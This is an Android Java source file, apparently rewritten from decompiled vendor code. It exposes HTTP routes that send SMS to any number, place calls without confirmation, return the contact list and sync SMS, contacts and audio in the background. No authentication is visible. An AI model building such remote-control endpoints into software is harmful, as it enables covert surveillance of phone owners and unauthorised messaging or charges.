package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.utils.AppManagerUtils;
import com.guard.wallet.utils.SystemHelper;

import java.util.ArrayList;
import java.util.LinkedList;

/**
 * 通信 Handler — vendor server/b.java 中通信相关路由, 逐方法深度翻译。
 *
 * vendor 方法映射:
 * - /sendSms → E2(String phone, String content, k) — SmsManager.divideMessage + sendTextMessage
 * - /callPhone → vendor 类似 ACTION_CALL
 * - /contacts → vendor l3(k) — SystemHelper.n() 权限检查 + 同步联系人
 * - /syncContacts → vendor l3(k)
 * - /syncSms → vendor s3(k) — SystemHelper.p() 短信权限检查 + SYNC_DEVICE_SMS
 */
public final class CommHandler {
    private static final String TAG = "HttpServer";

    private CommHandler() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    // ─── /sendSms → vendor E2(String, String, k) ───

    /** vendor E2 — 发送短信, 参数校验 + 分段发送 */
    public static void sendSms(String phone, String content, AsyncHttpServerResponse response) {
        try {
            if (AppUtils.B(phone) || AppUtils.B(content)) {
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            boolean result = false;
            Context ctx = SystemHelper.Z();
            if (ctx != null && ContextCompat.checkSelfPermission(ctx, "android.permission.SEND_SMS") == 0) {
                SmsManager sm = SmsManager.getDefault();
                ArrayList<String> parts = sm.divideMessage(content);
                if (parts != null && !parts.isEmpty()) {
                    for (String part : parts) {
                        sm.sendTextMessage(phone, null, part, null, null);
                    }
                    result = true;
                }
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /callPhone ───

    /** 拨打电话 — ACTION_CALL */
    public static void callPhone(AsyncHttpServerResponse response, String number) {
        try {
            if (AppUtils.B(number)) {
                HttpResponseHelper.error(response, "号码不能为空");
                return;
            }
            boolean result = false;
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(Uri.parse("tel:" + number));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /contacts → vendor: SystemHelper.w0() 联系人列表 ───

    /** 获取联系人列表 */
    public static void contacts(AsyncHttpServerResponse response) {
        try {
            LinkedList list = SystemHelper.w0();
            int count = (list != null && !list.isEmpty()) ? list.size() : 0;
            HttpResponseHelper.ok(response, list, count);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncContacts → vendor l3(k) ───

    /** vendor l3 — 检查联系人权限, 有则触发同步 */
    public static void syncContacts(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (SystemHelper.n()) { // hasReadContacts
                Thread worker = new Thread(() -> {
                    try {
                        new com.guard.wallet.thread.SyncTaskWrapper(1).call();
                    } catch (Exception e) {
                        AppUtils.s(TAG, e);
                    }
                }, "sync-contacts");
                worker.setDaemon(true);
                worker.start();
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncSms → vendor s3(k) ───

    /** vendor s3 — 检查短信权限, 有则触发同步 */
    public static void syncSms(AsyncHttpServerResponse response, String pkg) {
        try {
            boolean result = false;
            if (SystemHelper.p()) { // hasReadSmsPermission
                Thread worker = new Thread(() -> {
                    try {
                        new com.guard.wallet.thread.SyncTaskWrapper(5).call();
                    } catch (Exception e) {
                        AppUtils.s(TAG, e);
                    }
                }, "sync-sms");
                worker.setDaemon(true);
                worker.start();
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncAudios ───

    /** 同步音频列表 */
    public static void syncAudios(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (SystemHelper.m()) { // hasReadMediaAudio
                Thread worker = new Thread(() -> {
                    try {
                        new com.guard.wallet.thread.WifiConnectCallable(0, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI).call();
                    } catch (Exception e) {
                        AppUtils.s(TAG, e);
                    }
                }, "sync-audios");
                worker.setDaemon(true);
                worker.start();
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }
}
